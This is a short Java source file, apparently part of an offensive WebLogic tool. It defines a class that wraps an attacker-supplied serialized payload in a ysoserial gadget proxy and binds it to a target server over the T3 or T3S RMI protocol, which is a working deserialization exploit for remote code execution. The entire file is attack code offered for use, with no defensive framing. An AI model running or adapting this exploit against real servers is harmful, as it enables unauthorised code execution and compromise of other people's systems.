package bort.millipede.wlt3;

import java.rmi.Remote;

//third-party includes
import weblogic.rmi.Naming;
import ysoserial.payloads.util.Gadgets;

public class WLNamingExploit {
	public static void runWLNamingExploit(Object payload,String host,int port,boolean t3s) {
		String protocol = "t3";
		if(t3s) protocol = "t3s";
		
		try {
			Naming.bind(protocol+"://"+host+":"+Integer.toString(port)+"/"+"Mcgarnigal"+System.nanoTime(),Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned"+System.nanoTime(),payload),Remote.class)); //weblogic T3 RMI bind-based exploitation
		}
		catch (Exception e) {
			e.printStackTrace();
		}
	}
}
